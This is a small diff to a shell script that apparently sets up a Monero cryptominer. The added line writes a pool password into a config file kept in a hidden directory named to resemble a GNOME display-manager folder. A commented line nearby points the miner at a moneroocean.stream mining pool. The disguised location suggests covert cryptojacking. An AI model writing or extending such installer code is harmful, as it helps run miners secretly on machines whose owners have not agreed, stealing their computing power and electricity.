@@ -45,6 +45,8 @@ fi
 if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json
+
 
 echo "sed"
 #sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2_manual/config.json
